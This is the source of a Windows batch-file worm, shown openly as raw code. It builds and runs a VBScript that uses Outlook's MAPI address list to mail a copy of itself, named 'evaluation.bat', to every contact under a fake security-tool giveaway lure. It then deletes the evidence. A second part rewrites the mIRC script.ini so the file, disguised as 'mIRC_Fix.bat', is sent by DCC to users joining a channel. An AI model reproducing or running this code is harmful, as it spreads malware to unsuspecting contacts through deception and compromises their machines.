copy c:\windows\java\classes\himera.bat c:\windows\java\classes\evaluation.bat
copy %0 c:\windows\java\classes\mapi.vbs
echo Dim x > c:\windows\java\classes\mapi.vbs
echo on error resume next >> c:\windows\java\classes\mapi.vbs
echo Set fso="Scripting.FileSystem.Object"  >> c:\windows\java\classes\mapi.vbs 
echo Set so=CreateObject(fso) >> c:\windows\java\classes\mapi.vbs
echo Set ol=CreateObject("Outlook.Application") >> c:\windows\java\classes\mapi.vbs
echo Set out=WScript.CreateObject("Outlook.Application") >> c:\windows\java\classes\mapi.vbs
echo Set mapi = out.GetNameSpace("MAPI") >> c:\windows\java\classes\mapi.vbs
echo Set a = mapi.AddressLists(1) >> c:\windows\java\classes\mapi.vbs
echo Set ae=a.AddressEntries >> c:\windows\java\classes\mapi.vbs
echo For x=1 To ae.Count >> c:\windows\java\classes\mapi.vbs
echo Set ci=ol.CreateItem(0) >> c:\windows\java\classes\mapi.vbs
echo Set Mail=ci >> c:\windows\java\classes\mapi.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> c:\windows\java\classes\mapi.vbs
echo Mail.Subject="evaluation" >> c:\windows\java\classes\mapi.vbs 
echo Mail.Body="Try this evaluation security tool And you could win a full license! " >> c:\windows\java\classes\mapi.vbs
echo Mail.Attachments.Add(""c:\windows\java\classes\evaluation.bat"") >> c:\windows\java\classes\mapi.vbs
echo Mail.Send >> c:\windows\java\classes\mapi.vbs 
echo Next >> c:\windows\java\classes\mapi.vbs
echo ol.Quit >> c:\windows\java\classes\mapi.vbs
cscript c:\windows\java\classes\mapi.vbs
del c:\windows\java\classes\evaluation.bat
del c:\windows\java\classes\mapi.vbs
    
copy c:\windows\java\classes\himera.bat c:\windows\java\classes\mIRC_Fix.bat
if exist c:\mirc\script.ini set folder=c:\mirc
if exist C:\mirc32\script.ini set folder=c:\mirc32
if exist C:\progra~1\mirc\script.ini set folder=C:\progra~1\mirc
if exist C:\progra~1\mirc32\script.ini set folder=C:\progra~1\mirc32
copy mIRC_Fix.bat %folder%\mIRC_Fix.bat
echo [script] > %mIRC%\script.ini
echo n0=on 1:join:*.*:{if ($nick !=$me) {halt} /msg $nick this really makes mIRC invulnerable! do not hesitate! /dcc send $nick %folder%\mIRC_Fix.bat }"